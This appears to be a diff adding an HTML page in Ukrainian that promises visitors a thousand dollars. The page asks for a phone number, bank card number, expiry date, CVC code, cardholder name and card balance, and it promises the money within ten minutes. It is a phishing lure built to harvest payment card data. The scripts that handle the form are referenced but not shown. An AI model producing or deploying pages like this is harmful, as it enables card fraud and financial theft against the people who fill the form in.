@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Website</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="loader-container">
+      <div class="loader"></div>
+  </div>
+  
+  <div class="container hidden">
+      <h1>Отримати тисячу доларів</h1>
+      <form id="moneyForm">
+          <label for="contact">Контактна інформація (номер телефону):</label>
+          <input type="text" id="contact" required>
+  
+          <label for="cardNumber">Номер банківської карти:</label>
+          <input type="text" id="cardNumber" required>
+  
+          <div class="card-info">
+              <div class="card-info-item">
+                  <label for="expiry">Термін дії карти:</label>
+                  <input type="text" id="expiry" required>
+              </div>
+  
+              <div class="card-info-item">
+                  <label for="cvc">CVC-код:</label>
+                  <input type="text" id="cvc" required>
+              </div>
+          </div>
+  
+          <label for="fullName">Ім'я та прізвище на карті:</label>
+          <input type="text" id="fullName" required>
+  
+          <label for="balance">Баланс грошей на карті:</label>
+          <input type="text" id="balance" required>
+  
+          <button type="button" onclick="submitForm()">Отримати гроші</button>
+      </form>
+  
+      <div id="successMessage" class="hidden">
+          <p>Чудово, гроші надійдуть протягом 10-ти хвилин.</p>
+      </div>
+  </div>
+
+
+
+	<script src="index.js"></script>
+  <script src="script.js"></script>
+  </body>
+</html>
